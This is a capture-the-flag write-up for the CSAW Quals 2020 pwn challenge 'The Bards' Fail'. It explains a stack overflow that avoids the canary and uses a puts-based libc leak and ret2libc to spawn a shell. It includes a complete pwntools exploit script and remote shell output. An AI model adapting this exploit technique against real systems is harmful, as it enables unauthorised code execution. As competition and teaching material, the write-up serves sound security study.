---
title: The Bards' Fail - CSAW Quals 2020
date: 2020-09-15 20:05:10
author: Pwn-Solo
author_url: https://twitter.com/Pwn_Solo
categories:
  - Pwn
tags:
  - Exploitation
  - Linux
  - CSAW Quals
---

**tl;dr**
+ Carefully arranging structs on stack so as to overwrite saved rip , without corrupting the stack canary.
+ Leak libc with puts and execute a ret2libc to get shell 

<!--more-->

**Challenge Points:** 150
**Solves:** 97
**Solved by:** [Pwn-Solo](https://twitter.com/Pwn_Solo) ,[Cyb0rG](https://twitter.com/_Cyb0rG)

## Challenge description

***Pwn your way to glory! You do not need fluency in olde English to solve it, it is just for fun***

we're given the challenge binary along with the libc 

first off , lets take a look at the mitigations enabled 
```gdb
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

## Functionality

This is what the challenge binary looked like 

```text
*** Welcome to the Bards' Fail! ***

Ten bards meet in a tavern.
They form a band.
You wonder if those weapons are real, or just props...

Bard #1, choose thy alignment (g = good, e = evil):
g	
Choose thy weapon:
1) +5 Holy avenger longsword
2) +4 Crossbow of deadly accuracy
1
Enter thy name:
testname

Bard #2, choose thy alignment (g = good, e = evil):
```

It first asks us to initialize 10 Bards with the option of choosing their alignment (good or evil).
We control the weapon and name of each bard , which are then stored on the stack .

each Bard is stored in a sort of structure on the stack ... looking into it further , we see that the good and evil structs are not quite the same 

```text
'good' allocation -> 48 bytes
0240| 0x7ffdeef25150 --> 0xf0014006c 
0248| 0x7ffdeef25158 ("AAAAAAAA")  <-input 
0256| 0x7ffdeef25160 --> 0x0 
0264| 0x7ffdeef25168 --> 0x0 
0272| 0x7ffdeef25170 --> 0x0 
0280| 0x7ffdeef25178 --> 0x4032000000000000 ('')


'evil' allocation -> 56 bytes
0288| 0x7ffdeef25180 --> 0x63 ('c')
0296| 0x7ffdeef25188 --> 0x4032000000000000 ('')
0304| 0x7ffdeef25190 --> 0x424200140000000f 
0312| 0x7ffdeef25198 --> 0x424242424242 ('BBBBBB') <- input
0320| 0x7ffdeef251a0 --> 0x0 
0328| 0x7ffdeef251a8 --> 0x0 
0336| 0x7ffdeef251b0 --> 0x0 
```

## Exploitation

since evil allocates more bytes I used them to overflow the stack but was greeted with this message ...

```
AAAAAAAAAAAAAAAAAAAA is arrested.
*** stack smashing detected ***:
```

we can see our canary is at the offset 488 from the start of our input and since we give 56*10 bytes we end up corrupting it. The solution is to get our canary to overlap with our input string (instead of the constant data fields of the struct) so that we can choose to not overwrite it . Placing a "good" block at the start ends up doing that for us 

```
second last 'evil' block 
0680| 0x7ffcb4bcd168 --> 0x63 ('c')
0688| 0x7ffcb4bcd170 --> 0x4032000000000000 ('')
0696| 0x7ffcb4bcd178 --> 0x414100140000000f 
0704| 0x7ffcb4bcd180 ('A' <repeats 22 times>)
0712| 0x7ffcb4bcd188 ('A' <repeats 14 times>)
0720| 0x7ffcb4bcd190 --> 0x414141414141 ('AAAAAA')
0728| 0x7ffcb4bcd198 --> 0x69ac49fe9683bf00      <- canary
last 'evil' block 
0736| 0x7ffcb4bcd1a0 --> 0x7ffcb4bcd163 --> 0x630000000000 ('')
0744| 0x7ffcb4bcd1a8 --> 0x4032000000000000 ('') <- corrupted saved rip  
0752| 0x7ffcb4bcd1b0 --> 0x414100140000000f 
0760| 0x7ffcb4bcd1b8 --> 0x141414141 
```

Okay.. so the canary's safe but the data from the last evil struct overwrites the saved rip , lucky for us the 'good' allocation has its input starting from `param_1 + 8` which is exactly where the saved rip will be . All we do is make a 'good' allocation at the end instead and give in our payload to take control of rip.

```
Stopped reason: SIGSEGV
0x0000414141414141 in ?? ()
```

perfect ! now all we need is a libc leak and a simple ret2libc will do the rest  

## Exploit Code

```py
from pwn import *
import sys
import os

remote_ip,port = 'pwn.chal.csaw.io','5019'
binary = 'bard'
brkpts = '''
'''
if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)

else:
    io = process(binary,env={'LD_PRELOAD':'./libc-2.27.so'})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def good(weapon,name):
	sla(":\n",'g')
	sla("cy\n",str(weapon))
	sa("name:\n",name)

def evil(weapon,name):
	sla(":\n",'e')
	sla("ent\n",str(weapon))
	sa("name:\n",name)

def sheriff():
	sla("do?\n",'e')

def zombie(inp):
	sla("do?\n",inp)

def trigger(payload):
  for i in range(1):
		good(1,b"A"*8)
  for i in range(8):
		evil(1,b"B"*8)
  
  good(1,payload)
  gdb.attach(io,brkpts)
	
  for i in range(1):
		zombie('r')
  
  for i in range(8):
		sheriff()
	
  for i in range(1):
		zombie('r')	

#gadgets
puts = 0x4006d0
pop_rdi = 0x401143
main = 0x40107b
ret = 0x4006ae

if __name__== "__main__":	
	#good -> 48 bytes
	#bad  -> 56 bytes
	payload = p64(pop_rdi)
	payload += p64(0x602020)
	payload += p64(puts)
	payload += p64(main)
	trigger(payload)

	ru("away.")
	rl()
	leak = re(6)
	leak = u64(leak+b'\x00\x00')-0x80a30
	system = leak + 0x4f4e0
	binsh = leak +0x1b40fa
	
	log.info("base {} ".format(hex(leak)))
	log.info("sys {}".format(hex(system)))
	log.info("/bin/sh {}".format(hex(binsh)))

	payload = p64(ret)
	payload += p64(pop_rdi)
	payload += p64(binsh)
	payload += p64(system)
	trigger(payload)

	io.interactive()
```

The idea to get leaks was to call `puts@plt` using a GOT address as the argument ,Then call main again;to then which we give the payload to finally execute a ret2libc


```console
pwn-solo@m4chin3:~/ctf/csaw/bard$ python3 exploit.py remote
[+] Opening connection to pwn.chal.csaw.io on port 5019: Done
[*] base 0x7f9f7fe3a000 
[*] sys 0x7f9f7fe894e0
[*] /bin/sh 0x7f9f7ffee0fa
[*] Switching to interactive mode
Options:
(b)ribe
(f)latter
(r)un
$ ls
bard
flag.txt
$ cat flag.txt
flag{why_4r3_th3y_4ll_such_c0w4rds??}
```
